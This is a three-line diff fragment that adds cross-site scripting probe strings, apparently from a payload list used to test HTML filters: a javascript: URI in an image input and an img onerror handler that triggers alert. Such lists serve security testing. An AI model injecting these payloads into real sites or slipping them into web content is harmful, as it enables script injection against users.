@@ -1,0 +1,3 @@
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<div value = "XSS" type = text id='1'>
